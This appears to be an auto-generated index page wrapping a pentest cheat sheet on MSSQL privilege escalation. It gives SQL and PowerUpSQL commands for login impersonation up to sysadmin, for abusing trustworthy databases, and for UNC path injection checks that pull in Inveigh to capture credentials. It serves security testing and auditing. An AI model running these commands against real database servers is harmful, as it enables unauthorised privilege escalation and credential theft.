---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# MSSQL - Audit Checks

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-databases-mssql-audit-checks` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/databases/mssql-audit-checks.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [MSSQL - Audit Checks](../../topics/databases/mssql-audit-checks.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-databases-mssql-audit-checks |
| name | MSSQL - Audit Checks |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/databases/mssql-audit-checks.md |

## Preserved Source Material

````yaml
_body: "# MSSQL - Audit Checks\n\n## Summary\n\n* [Impersonation Opportunities](#impersonation-opportunities)\n    * [Exploiting\
  \ Impersonation](#exploiting-impersonation)\n    * [Exploiting Nested Impersonation](#exploiting-nested-impersonation)\n\
  * [Trustworthy Databases](#trustworthy-databases)\n\n## Impersonation Opportunities\n\n* Impersonate as: `EXECUTE AS LOGIN\
  \ = 'sa'`\n* Impersonate `dbo` with DB_OWNER\n\n ```sql\n SQL> select is_member('db_owner');\n SQL> execute as user = 'dbo'\n\
  \ SQL> SELECT is_srvrolemember('sysadmin')\n ```\n\n```ps1\nInvoke-SQLAuditPrivImpersonateLogin -Username sa -Password Password1234\
  \ -Instance \"<DBSERVERNAME\\DBInstance>\" -Exploit -Verbose\n\n# impersonate sa account\npowerpick Get-SQLQuery -Instance\
  \ \"<DBSERVERNAME\\DBInstance>\" -Query \"EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER(''sysadmin'')\" -Verbose -Debug\n\
  ```\n\n### Exploiting Impersonation\n\n```sql\nSELECT SYSTEM_USER\nSELECT IS_SRVROLEMEMBER('sysadmin')\nEXECUTE AS LOGIN\
  \ = 'adminuser'\nSELECT SYSTEM_USER\nSELECT IS_SRVROLEMEMBER('sysadmin')\nSELECT ORIGINAL_LOGIN()\n```\n\n### Exploiting\
  \ Nested Impersonation\n\n```sql\nSELECT SYSTEM_USER\nSELECT IS_SRVROLEMEMBER('sysadmin')\nEXECUTE AS LOGIN = 'stduser'\n\
  SELECT SYSTEM_USER\nEXECUTE AS LOGIN = 'sa'\nSELECT IS_SRVROLEMEMBER('sysadmin')\nSELECT ORIGINAL_LOGIN()\nSELECT SYSTEM_USER\n\
  ```\n\n## Trustworthy Databases\n\n```sql\nInvoke-SQLAuditPrivTrustworthy -Instance \"<DBSERVERNAME\\DBInstance>\" -Exploit\
  \ -Verbose \n\nSELECT name as database_name, SUSER_NAME(owner_sid) AS database_owner, is_trustworthy_on AS TRUSTWORTHY from\
  \ sys.databases\n```\n\n> The following audit checks run web requests to load Inveigh via reflection. Be mindful of the\
  \ environment and ability to connect outbound.\n\n```ps1\nInvoke-SQLAuditPrivXpDirtree\nInvoke-SQLUncPathInjection\nInvoke-SQLAuditPrivXpFileexist\n\
  ```"
_relative_path: databases/mssql-audit-checks.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/databases/mssql-audit-checks.md
````
